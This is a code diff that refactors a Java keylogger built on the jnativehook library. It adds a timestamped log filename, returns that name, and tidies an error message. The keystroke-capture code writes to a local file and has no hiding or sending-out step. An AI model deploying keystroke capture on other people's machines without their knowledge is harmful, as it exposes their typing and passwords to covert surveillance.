@@ -7,6 +7,8 @@ import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 
 import java.io.FileWriter;
 import java.io.IOException;
+import java.time.ZonedDateTime;
+import java.time.format.DateTimeFormatter;
 import java.util.Scanner;
 
 public class KeyLogger {
@@ -25,7 +27,9 @@ public class KeyLogger {
         return instance;
     }
 
-    public void startLog(String filename, long time) throws IOException {
+    public String startLog(long time) throws IOException {
+        String filename = "KEY LOG" + ZonedDateTime.now().format(DateTimeFormatter
+                .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
         FileWriter writer = new FileWriter(filename,false);
         NativeKeyListener listener = new NativeKeyListener() {
             @Override
@@ -51,7 +55,7 @@ public class KeyLogger {
                         break;
                     }
                 } catch (InterruptedException e) {
-                    System.out.println("error when stopping");
+                    System.out.println("Error when stopping");
                     e.printStackTrace();
                 }
             }
@@ -65,13 +69,13 @@ public class KeyLogger {
         finally {
             writer.close();
         }
-
+        return filename;
     }
 
     public static void main(String[] args) {
         System.out.println("Start log...");
         try {
-            KeyLogger.getInstance().startLog("log.txt",3000);
+            KeyLogger.getInstance().startLog(3000);
         } catch (IOException e) {
             throw new RuntimeException(e);
         }
